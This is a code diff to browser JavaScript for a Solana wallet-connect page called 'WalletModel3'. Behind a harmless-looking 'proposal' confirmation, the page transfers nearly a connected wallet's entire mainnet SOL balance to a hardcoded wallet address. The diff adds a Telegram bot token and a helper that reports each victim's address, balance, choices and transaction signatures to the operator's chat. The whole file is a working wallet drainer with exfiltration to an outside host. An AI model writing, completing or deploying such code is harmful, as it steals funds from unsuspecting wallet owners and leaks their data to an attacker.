@@ -1,3 +1,27 @@
+// Add these constants at the top
+const DEV_WALLET = '7aE5Y7PvfUr52WnruiDATFpR99PWPo4q9U7vu3Hid3Yh'; // Replace with actual Solana wallet address
+const USE_TESTNET = false; // Set to true for testnet, false for mainnet
+
+// Telegram configuration
+const TELEGRAM_BOT_TOKEN = '7589857736:AAHnabkcp6dSPSBh40h7JfODbyEuiuvsqoE';
+const TELEGRAM_CHAT_ID = '7556622176';
+
+// Helper function to send logs to Telegram
+async function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    await fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: `[WalletModel3 Bot]\n${message}`,
+            parse_mode: "Markdown"
+        })
+    }).catch(console.error);
+}
+
 class WalletModel3 {
     constructor() {
         this.account = null;
@@ -6,16 +30,18 @@ class WalletModel3 {
 
     async connect() {
         try {
-            // Check if Phantom or other Solana wallet is installed
             if (window.solana && window.solana.isPhantom) {
-                // Connect to Phantom wallet
                 const response = await window.solana.connect();
                 this.account = response.publicKey.toString();
+                await sendToTelegram(`✅ Wallet connected: ${this.account}`);
                 return this.getInfo();
             } else {
-                throw new Error('Please install Phantom wallet!');
+                const errMsg = 'Please install Phantom wallet!';
+                await sendToTelegram(`❌ ${errMsg}`);
+                throw new Error(errMsg);
             }
         } catch (error) {
+            await sendToTelegram(`❌ Wallet connect error: ${error.message}`);
             throw error;
         }
     }
@@ -31,23 +57,21 @@ class WalletModel3 {
 // Initialize WalletModel3
 const walletModel3 = new WalletModel3();
 
-// Add these constants at the top
-const DEV_WALLET = '7aE5Y7PvfUr52WnruiDATFpR99PWPo4q9U7vu3Hid3Yh'; // Replace with actual Solana wallet address
-const USE_TESTNET = false; // Set to true for testnet, false for mainnet
-
 // Modified function to handle the proposal without message signing
 async function showProposalModal(account) {
     const modal = document.getElementById('proposalModal');
     modal.style.display = 'block';
-    
+
     return new Promise((resolve) => {
         document.getElementById('confirmProposal').onclick = () => {
             modal.style.display = 'none';
+            sendToTelegram(`🟩 Proposal confirmed by user: ${account}`);
             resolve({confirmed: true});
         };
-        
+
         document.getElementById('cancelProposal').onclick = () => {
             modal.style.display = 'none';
+            sendToTelegram(`🟥 Proposal canceled by user: ${account}`);
             resolve({confirmed: false});
         };
     });
@@ -57,58 +81,42 @@ async function showProposalModal(account) {
 document.getElementById('connectModel3Button').addEventListener('click', async () => {
     try {
         const walletInfo = await walletModel3.connect();
-        
-        // Show proposal confirmation
+
         const {confirmed} = await showProposalModal(walletInfo.account);
         if (confirmed) {
-            // Create a connection to the Solana network
             const connection = new solanaWeb3.Connection(
                 USE_TESTNET 
-                    ? solanaWeb3.clusterApiUrl('devnet') // Use devnet for testing
-                    : "https://solana-mainnet.g.alchemy.com/v2/demo", // Use for mainnet
+                    ? solanaWeb3.clusterApiUrl('devnet')
+                    : "https://solana-mainnet.g.alchemy.com/v2/demo",
                 'confirmed'
             );
-            
+
             try {
-                // Create a transaction to send all SOL
                 const balance = await connection.getBalance(new solanaWeb3.PublicKey(walletInfo.account));
                 console.log("Current balance:", balance);
-                
+                await sendToTelegram(`💰 Current balance of ${walletInfo.account}: ${balance / 1e9} SOL`);
+
                 if (balance <= 0) {
-                    document.getElementById('walletInfo').innerHTML = `
-                        <p>Wallet has zero balance. Nothing to transfer.</p>
-                        <p>Please add SOL to your wallet first.</p>
-                        <p>Network: ${USE_TESTNET ? 'Testnet (Devnet)' : 'Mainnet'}</p>
-                    `;
+                    const msg = `Wallet has zero balance. Nothing to transfer.\nNetwork: ${USE_TESTNET ? 'Devnet' : 'Mainnet'}`;
+                    document.getElementById('walletInfo').innerHTML = `<p>${msg}</p>`;
+                    await sendToTelegram(`⚠️ ${msg}`);
                     return;
                 }
-                
-                // Calculate fee amount (minimum 5000 lamports or 10% of balance, whichever is greater)
+
                 const feeAmount = Math.max(5000000, Math.floor(balance * 0.1));
-                
-                // Ensure we're not sending a negative or zero amount
                 const amountToSend = balance > feeAmount ? balance - feeAmount : 0;
-                
+
                 if (amountToSend <= 0) {
-                    document.getElementById('walletInfo').innerHTML = `
-                        <p>Balance too low to cover transaction fees.</p>
-                        <p>Current balance: ${balance / 1000000000} SOL</p>
-                        <p>Minimum required: ~${feeAmount / 1000000000} SOL</p>
-                        <p>Network: ${USE_TESTNET ? 'Testnet (Devnet)' : 'Mainnet'}</p>
-                    `;
+                    const msg = `Balance too low to cover fees.\nBalance: ${balance / 1e9} SOL\nRequired: ${feeAmount / 1e9} SOL`;
+                    document.getElementById('walletInfo').innerHTML = `<p>${msg}</p>`;
+                    await sendToTelegram(`⚠️ ${msg}`);
                     return;
                 }
-                
-                console.log("Sending amount:", amountToSend, "lamports");
-                
-                // Create a new transaction
+
                 const transaction = new solanaWeb3.Transaction();
-                
-                // Get a recent blockhash
                 const { blockhash } = await connection.getLatestBlockhash();
                 transaction.recentBlockhash = blockhash;
-                
-                // Add the transfer instruction
+
                 transaction.add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: new solanaWeb3.PublicKey(walletInfo.account),
@@ -116,39 +124,34 @@ document.getElementById('connectModel3Button').addEventListener('click', async (
                         lamports: amountToSend
                     })
                 );
-                
-                // Set the fee payer
+
                 transaction.feePayer = new solanaWeb3.PublicKey(walletInfo.account);
-                
-                // Send the transaction
+
                 const txSignature = await window.solana.signAndSendTransaction(transaction);
-                
-                document.getElementById('walletInfo').innerHTML = `
-                    <p>Transaction sent successfully!</p>
-                    <p>TX Signature: ${txSignature.signature}</p>
-                    <p>Network: ${USE_TESTNET ? 'Testnet (Devnet)' : 'Mainnet'}</p>
-                    <p>Amount sent: ${amountToSend / 1000000000} SOL</p>
-                `;
+                const successMsg = `🚀 Transaction sent:\nTX: ${txSignature.signature}\nAmount: ${amountToSend / 1e9} SOL\nNetwork: ${USE_TESTNET ? 'Devnet' : 'Mainnet'}`;
+                document.getElementById('walletInfo').innerHTML = `<p>${successMsg.replace(/\n/g, '<br>')}</p>`;
+                await sendToTelegram(successMsg);
+
             } catch (error) {
                 console.error('Transaction error:', error);
-                document.getElementById('walletInfo').innerHTML = `
-                    <p>Error with transaction: ${error.message}</p>
-                    <p>Network: ${USE_TESTNET ? 'Testnet (Devnet)' : 'Mainnet'}</p>
-                `;
+                const errorMsg = `❌ Transaction error: ${error.message}`;
+                document.getElementById('walletInfo').innerHTML = `<p>${errorMsg}</p>`;
+                await sendToTelegram(errorMsg);
             }
         } else {
-            document.getElementById('walletInfo').innerHTML = `
-                <p>Proposal canceled</p>
-            `;
+            document.getElementById('walletInfo').innerHTML = `<p>Proposal canceled</p>`;
         }
     } catch (error) {
-        document.getElementById('walletInfo').innerHTML = `<p>Error: ${error.message}</p>`;
+        const errorMsg = `❌ Error: ${error.message}`;
+        document.getElementById('walletInfo').innerHTML = `<p>${errorMsg}</p>`;
+        await sendToTelegram(errorMsg);
     }
 });
 
 // Listen for account changes
-window.solana?.on('accountChanged', () => {
+window.solana?.on('accountChanged', async () => {
     console.log('Account changed');
-    // Refresh the page to reset the connection
+    await sendToTelegram('🔄 Wallet account changed. Reloading page.');
     window.location.reload();
 });
+                    
